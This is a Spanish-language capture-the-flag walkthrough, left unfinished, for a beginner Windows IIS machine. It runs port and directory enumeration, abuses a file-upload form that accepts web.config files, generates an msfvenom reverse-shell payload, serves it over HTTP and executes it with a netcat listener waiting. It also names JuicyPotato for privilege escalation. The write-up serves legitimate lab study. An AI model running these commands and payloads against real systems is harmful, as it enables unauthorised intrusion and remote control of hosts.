# Ensalá Papas

Máquina de nivel principiante (Windows). IP: `192.168.33.117` — nombre NetBIOS: `WIN-4QU3QNHNK7E`

## 1. Reconocimiento

Escaneo de puertos y servicios con `nmap`:

```
nmap -p- --open --min-rate 5000 -sS -Pn -n -vvv 192.168.33.117
nmap -sV -sC -p- -Pn 192.168.33.117
```

![[Pasted image 20261020140716.png]]

![[Pasted image 20261020140739.png]]

Se abren los puertos:

- **80/tcp** → Microsoft IIS httpd 7.5, con título **IIS7**. Habilita los métodos `OPTIONS TRACE GET HEAD POST` (el método `TRACE` es potencialmente riesgoso).
- **135/tcp** → msrpc (Windows RPC).
- **139/tcp** → netbios-ssn.
- **445/tcp** → microsoft-ds (SMB), con firma de mensajes habilitada pero no obligatoria.
- **47001/tcp** → Microsoft HTTPAPI httpd 2.0 (WinRM/UPnP).
- **49152–49158/tcp** → Windows RPC.

Datos del host: sistema operativo **Windows**, workgroup `WORKGROUP`.

## 2. Enumeración web

Al abrir `http://192.168.33.117` en el navegador vemos la página por defecto de **IIS7**:

![[Pasted image 20261020142255.png]]

Enumeramos directorios y archivos con `gobuster`, usando el diccionario `DirBuster-2.3-medium.txt` y filtrando extensiones típicas de ASP.NET:

```
gobuster dir -u http://192.168.33.117 -w /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x asp,aspx,txt,html,php,bak,old,config,ig,json,xml
```

![[Pasted image 20261020143020.png]]

La mayoría de coincidencias devuelven `400`, pero **`zoc.aspx`** responde con **200** (1159 bytes) y resulta ser un formulario de subida de archivos llamado **Secure File Transfer**:

![[Pasted image 20261020143148.png]]

## 3. Formulario de subida de archivos

Probamos el formulario con distintos archivos para descubrir qué extensiones acepta. Un archivo no permitido muestra el mensaje de error:

![[Pasted image 20261020151548.png]]

`Invalid File. Please try again`

Mientras que un archivo con una extensión válida sí se sube correctamente:

![[Pasted image 20261020151608.png]]

`File uploaded successfully.`

Las extensiones aceptadas son:

- `.config`
- `.doc` / `.docx`
- `.gif`
- `.jpeg` / `.jpg`
- `.png`
- `.xls` / `.xlsx`

De todas ellas, la interesante es **`.config`**: permitiendo subir un `web.config` podemos declarar un `<handlers>` o un `<httpHandlers>` que asocie una extensión a un módulo que ejecute código, lo que convierte la subida de archivos en ejecución remota de código (RCE). En el listado de archivos del servidor se confirma que se generaron `web.config`, `rs.aspx` y `rs.exe`.

## 4. Payload y servidor de descarga

Generamos un payload de reverse shell para Windows de 64 bits:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.33.106 LPORT=1988 -f exe -o rs.exe
```

Servimos los archivos desde nuestra máquina con un servidor HTTP y dejamos escuchando el listener de la reverse shell en el puerto `1988`:

```
python3 -m http.server 80
nc -lnvp 1988
```

![[Pasted image 20261020164303.png]]

El servidor de la víctima (`192.168.33.117`) descarga el binario varias veces:

```
192.168.33.117 -- - [20/Oct/2026 17:34:44] "GET /rs.exe HTTP/1.1" 200 -
```

## 5. Ejecución del binario

La propia página cuenta con un campo para ejecutar un archivo ya subido, con la ruta `c:\tmp\rs.exe` y un botón **Run**:

![[Pasted image 20261020164205.png]]

Al ejecutarlo, el binario se lanza desde `c:\tmp` con el usuario del servicio IIS y conecta hacia nuestro listener.

## 6. Pendiente

> La máquina está a medias en esta nota: falta documentar la recepción de la shell, la enumeración interna y la escalada de privilegios. En el listado del servidor aparece un `JuicyPotato.exe`, así que la ruta de escalada pasa probablemente por esa herramienta de potato/juicy para Windows.
